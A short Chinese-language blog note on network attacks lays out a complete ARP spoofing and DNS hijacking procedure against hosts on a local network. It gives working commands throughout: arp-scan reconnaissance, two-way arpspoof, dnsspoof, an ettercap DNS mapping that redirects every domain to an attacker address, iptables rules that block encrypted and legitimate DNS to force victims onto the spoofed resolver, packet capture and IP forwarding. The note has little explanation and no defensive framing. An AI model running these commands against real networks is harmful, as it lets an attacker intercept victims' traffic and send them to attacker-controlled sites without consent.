---
title: DNS劫持
categories:
  - cybersec
description: DNS劫持
date: 2025-03-15 20:26:09
tags:
---

# 1.获取 ip mac 地址信息

`ip a` 得到本机 ip 地址  
`ip route` 得到网关地址  
`arp-scan --interface=eth0 --localnet` 扫描统一子网下主机

# 2.ARP劫持（成为中间人）

```bash
arpspoof -i eth0 -t 目标IP -r 网关IP   # 欺骗目标设备 告诉目标主机，网关ip对应的mac地址是攻击机的mac地址
arpspoof -i eth0 -t 网关IP -r 目标IP   # 欺骗网关（双向劫持）
```

# 3.DNS劫持

## 使用 dnsspoof

`dnsspoof -i eth0 -f hosts.txt`

## 使用 ettercap

### 配置域名映射文件

`sudo vim /etc/ettercap/etter.dns`

```etter.dns
httpforever.com A 39.156.66.10
* A 192.168.65.100
```

### 运行命令

`ettercap -T -i eth0 -M arp:remote /受害者IP// /网关IP// -P dns_spoof`

# 其他命令

```bash
iptables -A FORWARD -p tcp --dport 443 -j DROP # 阻断加密 DNS 
iptables -A FORWARD -p udp --dport 53 -d 192.168.65.2 -j DROP # 阻断合法 DNS 

tcpdump -i eth0 host 192.168.65.2 or host 192.168.65.132 # 获取 tcp 流量
echo 1 > /proc/sys/net/ipv4/ip_forward # 开启 IP 转发
```